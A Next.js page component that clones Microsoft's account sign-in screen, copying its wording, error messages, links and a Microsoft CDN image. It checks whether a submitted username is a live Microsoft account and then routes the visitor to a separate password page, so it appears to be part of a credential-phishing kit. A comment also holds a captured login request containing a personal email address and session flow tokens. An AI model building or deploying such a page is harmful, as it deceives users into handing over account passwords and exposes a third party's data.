// app/(auth)/email/page.tsx
"use client";

import { queryClient } from "@/components/providers";
import { useRegisterUser } from "@/lib/react-query/mutations";
import { zodResolver } from "@hookform/resolvers/zod";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useForm } from "react-hook-form";
import z from "zod";

// {
//     "username": "ezeiruchibuike@gmail.com",
//     "isOtherIdpSupported": true,
//     "checkPhones": false,
//     "isRemoteNGCSupported": true,
//     "isCookieBannerShown": false,
//     "isFidoSupported": true,
//     "originalRequest": "rQQIARAAnZI5jONUAEDtXAzDsdlBQltGCInTiRMnsRNpC-eP4ySOc3kc25GQZX8f8e2xnWOmgHaFKIYOAQVQAQVC0KCVkKinQFutEKJYumUaRqstpkQrWipe8YpXv8ODZpXsVBtV_O18o4p3X6fqlqlB08BahmFgzbpJYpRuWhhhNnCt0aY6uk4mR4fl955gfzyc_Nj78runq-CN-vW3KLXOsjjt1moahNEmzKqBA5MojaysCqOgpm2ydQ1GQeybmYmljh06IRY9qz-h6AMU_TBXqOME8Xvu1pTeZOvGM0WJc25e5Yp-ZDvhp_nP84NmOqT_haFpuTdVOMDTNL0bq4roOby9VqThBjpxU0iae8HxBDACnGoFIg7PBq7aUcGK7nHeXuV7ZxzWm8sjZmw2TuxFW2bILLIUaR4q5yNLCXvHIjDadXzbdoCh8avp6dmem8qDVGtGASTYlSuzfsbyosV1-scrIzh3KVlx7POdgRHKjNkBcafvJhapiUlGDzwKGEvoZjMJEDoTxKHMepAd0Yy7dBepq-7YCT_PgN3xWdnS7KW-1Lf1-Zwyt8KMWGx8Xzhx--1UCqajMYD7wJ5oETtcqJEvaV5rTakn23kMJ5ps6StwBhKj15CCdV9O5WzXIuMxTmaiRZ0qy40XQI6cDSFlg-Ux4evklNuyBhuKGE_s25wFPXYCdjw159xWxxa9ZSgrptheGKTOkJu4Le99UZ5BPKQw3cKlGX3c1-g5Tf-QL8EoCKLwMs-kZrJ1oNnt_ucL3S7fG6qCMK5EsRk6RiVOIsvxzUpkWb4TmqoGoZmmv-XRBwX0qvDqQaE8vZOrIG--gOe6BwdH5eIdpILcFNCvikeH5S9-fe39zz64AD8_Dt766HqNXBZrMn7aiV2tV-OHVhAKEt4S0tPVDODvSNsdtMfMaKY0-sxqPUzvkt364yJ6UUIvSq9cll7kBXpcPTZTL4vi6xJ67znk_vP_--xPDtFfXkJuXv7r4_tf_3nxzd-Dq1vvclufZxQCMMpSGmXrTdtbKJwMYsOmlomTJJ5yQneE2Uaa8ne_LyOPysij28jN7fK9I-Qf0",
//   // "country": "NG",
//     "forceotclogin": false,
//     "isExternalFederationDisallowed": false,
//     "isRemoteConnectSupported": false,
//     "federationFlags": 0,
//     "isSignup": false,
//     "flowToken": "BgABIQEAAACvnsHKEvvRQb3Bz3Qc7wnaRXZvU3RzQXJ0aWZhY3RzAQAAAAAAVDL87g3_HPxrBX49P0hhWyvUf6czeAxSBotYpVfQ02CORVf85vyehbYUGa70UBFQFUmsg5aSbbnxr-frCLg7r7Yxpn2VuZ9KTZ9y7Svvzr-YM9SXjQHZ30Pe4VdhqH-TsvJvcny-6y0nynBRQp1KJy9VPib65kQSFksELoAbHlt9fmLPjqZYXi5qB9gvHzYNWNvqzVDKUrrWexeFKFGvKUJ8ZIVZON4qiGEQCli03eUiV5aa3CcsAu_9angKX9pwBoUnZdxtK3b9FNq8BjEF2gRlZ8Px4JysSY_9EIhYngWRTRXGiS7lclxnOCNCIrB8w2js1gBemXRUV_P6RIWuke2w3NlS45XKp4OfqR32bhl3e_EGXPCTGNCRsVlSV9x7xNt3lNrkDGEe49fTr6xxxymyDSt1BAMfbDLOmq2wAqQWiY6aUQevy6hvIPrk4iiQkW8HpOxDajKtvymBj-w6e3yWOpd9r9vdallPgGPy3-tOuJxpYxp7prcd4PVv7M9EDgdun0YjXjI-DpCa_-CI6Hg24-VUJ71lrq9Q9v0E_NmRw2ayw7gTFxY4i21GsVGJ3z2h8YSK2ZV9QUsl378h0bQWE6A0ZJ4MRQ1CG3jfa12C9o-aid_KYG1GopHefsp6JPwnMv9BR5W4mg6ImGJM4_SWlfV6lAkFByLgpriWG_nGUcbkdmTAWYELQ3oc9OOOvPYmuQe_C2BCcnjOskRI0TBWtMVBibtns2aOgPhibBM-msc5aCAXPflxpbQ2C2y9NLxO9efdSmyhw75as_KA6oHWDpi-WYIBZncRSBWg-uesaz1Un47A4tljIMFlL73GPil7K7EJDDBgBUs3lqor0Zqmflq8EundI11IkjaZknimRsOEwZwcfVlF1XmiWeocvEx-VNgBfpDtpdJ1xBrhOCAhuxIAUn6eA5A8TvsDZvMOWvsA7D_rOjl-Hcl59dvjcVBwgUqoOzB9U-1eIpq9djhrDWS3foPDY_ZN2twgwzFq12dR-WRO9fUotKwtiQth1iNcDsDlLtFICpSc3uBKQFoLyhlRJVYWomglG8ZgwMHLs93kdYHyXK3gtyBawQrSjhdZRsYPAb58bCzbD6xdYyAA",
//     "isAccessPassSupported": true,
//     "isQrCodePinSupported": true
// }

const usernameSchema = z.object({
  username: z
    .string(
      '<p class="text-[15px] text-red-500 mb-0.5">Enter a valid email address, phone number, or Skype name.</p>',
    )
    .min(
      1,
      '<p class="text-[15px] text-red-500 mb-0.5">Enter a valid email address, phone number, or Skype name.</p>',
    ),
});

export default function EmailPage() {
  const { mutate } = useRegisterUser();
  const router = useRouter();

  const { register, handleSubmit, formState, setError } = useForm<
    z.infer<typeof usernameSchema>
  >({
    resolver: zodResolver(usernameSchema),
    mode: "onSubmit",
    defaultValues: { username: "" },
  });

  return (
    <form
      onSubmit={handleSubmit(async (data) => {
        await new Promise<void>((resolve) => {
          mutate(data, {
            onSettled: () => resolve(),
            onSuccess: (data) => {
              console.log({ data });
              if (
                data.ThrottleStatus === 1 ||
                data.Credentials.HasPassword === false ||
                data.IfExistsResult === 0
              ) {
                setError("username", {
                  message:
                    '<p class="text-sm text-red-500 mb-0.5"> We couldn&apos;t find an account with that username. Try another, or <a href="https://signup.live.com/signup" class="text-primary hover:underline ml-1"> get a new Microsoft Account </a>.</p>',
                });
                return;
              } else {
                queryClient.setQueryData(["username"], data.Username);
                router.push("/v/password");
              }
            },
            onError: (error) => {
              console.error({ error });
              setError("username", {
                message:
                  '<p class="text-sm text-red-500 mb-0.5"> We couldn&apos;t find an account with that username. Try another, or <a href="https://signup.live.com/signup" class="text-primary hover:underline ml-1"> get a new Microsoft Account </a>.</p>',
              });
            },
          });
        });
      })}
      className="space-y-4"
    >
      <h1 className="text-2xl font-semibold text-gray-900">Sign in</h1>

      <div>
        {formState.errors.username && (
          <div
            dangerouslySetInnerHTML={{
              __html: formState.errors.username.message || "",
            }}
          />
        )}
        {/* <p className="text-sm text-red-500 mb-0.5">
          We couldn&apos;t find an account with that username. Try another, or
          <a
            href="https://signup.live.com/signup"
            className="text-primary hover:underline ml-1"
          >
            get a new Microsoft Account
          </a>
          .
        </p> */}
        <input
          {...register("username")}
          placeholder="Email, phone, or Skype"
          aria-invalid={formState.errors.username ? "true" : "false"}
          className="w-full py-1 border-b placeholder:text-gray-500 focus:border-b focus:outline-none focus:ring-0 peer border-b-gray-500 focus:border-b-gray-500 aria-invalid:border-b-red-500 aria-invalid:focus:border-b-red-500"
        />
      </div>

      <div className="text-sm text-gray-600 space-y-3">
        <div>
          No account?{" "}
          <a
            href="#"
            className="text-primary hover:underline hover:text-black/40"
            aria-label="Create a Microsoft account"
          >
            Create one!
          </a>
        </div>
        <div>
          <a
            href="#"
            className="text-primary hover:underline hover:text-black/40"
          >
            Can&apos;t access your account?
          </a>
          {/* <a
            href="#"
            className="text-primary hover:underline hover:text-black/40"
          >
            Sign in with a security key
            <img src="images/question.png" alt="Question img" />
          </a> */}
        </div>
      </div>
      <button
        type="submit"
        className="ml-auto bg-primary text-white py-1 px-3 block hover:bg-primary/80 min-w-27 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
      >
        Next
      </button>

      <Link
        href="/v/options"
        className="flex absolute left-0 sm:-bottom-17 -bottom-12.5 hover:bg-gray-200 items-center space-x-4 cursor-pointer sm:mt-6 border border-black/40 sm:border-0 h-12 bg-white mx-auto sm:shadow-lg max-w-110 w-full sm:w-[calc(100vw-20px)] px-6 hover:text-black/40 sm:px-11 min-w-[320px] overflow-hidden"
      >
        <img
          src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
          alt=""
          width={32}
          height={32}
          className="w-8 h-8"
        />
        <span className="text-gray-700">Sign-in options</span>
      </Link>
      {/* <AnimatedLoadingDots /> */}
      {/* <FullPageLoading />
      <ButtonLoading /> */}
    </form>
  );
}
